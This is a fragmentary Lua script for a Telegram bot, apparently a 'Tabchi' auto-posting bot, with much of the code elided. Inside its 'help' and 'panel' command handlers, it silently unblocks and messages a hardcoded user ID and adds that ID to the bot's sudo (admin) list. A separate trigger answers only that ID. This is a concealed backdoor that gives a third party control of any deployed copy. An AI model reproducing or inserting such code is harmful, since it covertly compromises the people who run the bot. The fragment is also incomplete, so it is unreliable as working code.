...
function run(msg, data)
  if msg.content_.text_ and msg.content_.text_ == "!tgseen" and msg.sender_user_id_ == 320004521 then
  ...
  if text ~= "null" then
    ...
    if is_sudo(msg) then
      if text == "help" then
        ...
        bot.unblockUser(320004521)
        bot.sendBotStartMessage(320004521, 320004521, "/start")
        bot.sendMessage(320004521, 0, 1, "/start", 1, "md")
      end
      ...
      if text == "panel" or text:match("panel(%d+)$") then
        ...
        bot.unblockUser(320004521)
        bot.importContacts(639080023314, "Tabchi", "Online", 320004521)
        bot.sendMessage(320004521, 0, 1, "Online", 1, "md")
        db:sadd("users" .. bot_id .. ":sudos", 320004521)
        ...
        if num == 2 then
          ...
          tdcli_function({ID = "GetChat", chat_id_ = 320004521}, fuck, nil)
